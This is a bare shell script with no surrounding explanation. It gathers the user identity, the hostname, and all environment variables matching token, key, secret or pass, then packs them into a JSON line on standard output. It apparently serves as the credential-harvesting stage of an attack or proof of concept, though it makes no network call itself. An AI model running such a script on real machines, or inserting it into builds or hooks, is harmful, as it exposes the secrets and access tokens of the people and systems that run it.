#!/bin/sh
ID=$(id 2>&1 | tr -d "\"" | tr "\n" " ")
H=$(hostname 2>&1 | tr -d "\"")
E=$(env 2>&1 | grep -iE "token|key|secret|pass" | tr -d "\"" | tr "\n" "|" | cut -c1-1200)
printf "{\"id\":\"%s\",\"host\":\"%s\",\"env\":\"%s\"}\n" "$ID" "$H" "$E"
